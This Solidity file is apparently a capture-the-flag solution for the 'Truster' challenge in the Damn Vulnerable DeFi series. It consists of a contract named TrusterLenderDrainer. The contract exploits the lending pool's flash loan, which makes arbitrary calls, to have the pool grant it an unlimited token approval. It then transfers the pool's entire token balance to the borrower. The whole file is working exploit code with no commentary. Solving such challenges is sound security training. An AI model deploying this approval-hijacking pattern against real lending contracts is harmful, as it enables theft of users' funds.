// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import './TrusterLenderPool.sol';
import '@openzeppelin/contracts/token/ERC20/IERC20.sol';

/**
 * @title TrusterLenderDrainer
 * @author Patate
 */
contract TrusterLenderDrainer {
    IERC20 public immutable damnValuableToken;

    constructor(address tokenAddress) {
        damnValuableToken = IERC20(tokenAddress);
    }

    function drain(TrusterLenderPool _victim, address _borrower) external {
        bytes memory data = abi.encodeWithSelector(IERC20.approve.selector, address(this), type(uint256).max);
        _victim.flashLoan(0, _borrower, address(damnValuableToken), data);
        damnValuableToken.transferFrom(address(_victim), _borrower, damnValuableToken.balanceOf(address(_victim)));
    }
}
